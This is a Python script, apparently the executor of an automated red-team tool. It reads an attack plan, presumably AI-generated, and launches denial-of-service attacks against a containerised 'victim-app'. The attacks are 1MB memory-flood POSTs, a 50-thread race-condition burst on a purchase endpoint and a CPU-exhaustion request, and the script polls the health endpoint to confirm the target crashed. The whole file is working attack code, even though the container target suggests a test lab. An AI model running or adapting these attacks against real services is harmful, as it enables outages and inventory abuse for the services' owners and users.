import json
import requests
import threading
import time
import sys

# CONFIGURATION
VICTIM_URL = "http://victim-app:8080"
PLAN_FILE = "attack_plan.json"

def check_health():
    """Checks if the Victim is still alive."""
    try:
        r = requests.get(f"{VICTIM_URL}/api/health", timeout=2)
        return r.status_code == 200
    except:
        return False

def attack_memory_leak(endpoint):
    print(f"Launching MEMORY FLOOD on {endpoint}...")
    # Payload: 1MB string
    payload = "A" * 1024 * 1024 
    
    # We send requests until it likely crashes
    for i in range(1, 100):
        try:
            r = requests.post(f"{VICTIM_URL}{endpoint}", data=payload, timeout=1)
            print(f"      -> Injecting Chunk {i} (Status: {r.status_code})")
        except:
            print("      -> Connection failed (Target might be dead!)")
            break

def attack_race_condition(endpoint):
    print(f"Launching CONCURRENCY STORM on {endpoint}...")
    
    def buy_request():
        try:
            requests.post(f"{VICTIM_URL}{endpoint}")
        except:
            pass

    # Launch 50 threads at the EXACT same time
    threads = []
    for _ in range(50):
        t = threading.Thread(target=buy_request)
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
        
    # Check the damage
    r = requests.get(f"{VICTIM_URL}/api/inventory")
    print(f"      -> Attack Complete. Remaining Inventory: {r.text}")

def attack_cpu_stress(endpoint):
    print(f"Launching CPU ORBITAL CANNON on {endpoint}...")
    try:
        # Ask for 1 billion iterations to freeze the CPU
        requests.get(f"{VICTIM_URL}{endpoint}?iterations=2000000000", timeout=1)
    except requests.exceptions.ReadTimeout:
        print("      -> Success! Server timed out (CPU is fried).")
    except Exception as e:
        print(f"      -> Attack status: {e}")

def execute_plan():
    print("LOADING ATTACK PLAN...")
    
    try:
        with open(PLAN_FILE, 'r') as f:
            attacks = json.load(f)
    except FileNotFoundError:
        print("No plan found! Run 'strategist.py' first.")
        return

    print(f"FOUND {len(attacks)} VULNERABILITIES. ENGAGING...")

    for attack in attacks:
        print(f"\n⚡ TARGET: {attack['name']}")
        print(f"   TYPE: {attack['type']}")
        
        # 1. CLEANUP: Strip HTTP verbs and params
        raw_endpoint = attack['trigger_endpoint']
        # Remove GET/POST and trim whitespace
        clean_endpoint = raw_endpoint.replace("GET ", "").replace("POST ", "").strip()
        # Remove query parameters for the function call (we might add them back for CPU attacks)
        base_endpoint = clean_endpoint.split("?")[0]
        
        # 2. SMART DISPATCHER (Fuzzy Matching)
        # We convert everything to lowercase to make matching easier
        vuln_type = attack['type'].lower()
        vuln_name = attack['name'].lower()
        thought = attack.get('thought_signature', '').lower()
        
        # COMBINE all text to search for keywords
        full_context = f"{vuln_type} {vuln_name} {thought}"

        # --- LOGIC MAPPING ---
        
        # IF it involves Memory, Logs, or Storage -> Memory Flood
        if any(x in full_context for x in ["memory", "leak", "log", "queue", "storage", "heap"]):
            attack_memory_leak(base_endpoint)
            
        # IF it involves Inventory, Race, Stock, Buying, or Business Logic -> Race Condition
        elif any(x in full_context for x in ["race", "concurrency", "inventory", "stock", "buy", "business logic"]):
            attack_race_condition(base_endpoint)
            
        # IF it involves CPU, Loop, Exhaustion, or DoS -> CPU Stress
        elif any(x in full_context for x in ["cpu", "dos", "exhaustion", "loop", "resource", "parasite", "heavy"]):
            attack_cpu_stress(base_endpoint)
            
        else:
            print(f"   [?] No automated script matches context: {vuln_type}")

        # Check if we killed it
        if not check_health():
            print("\nTARGET DOWN! VICTIM APP HAS CRASHED.")
            return

    print("\nAttack Cycle Finished. Target is still standing.")

if __name__ == "__main__":
    # Wait a second for the network to settle
    time.sleep(2)
    if check_health():
        execute_plan()
    else:
        print("Victim is already dead. Please restart the container.")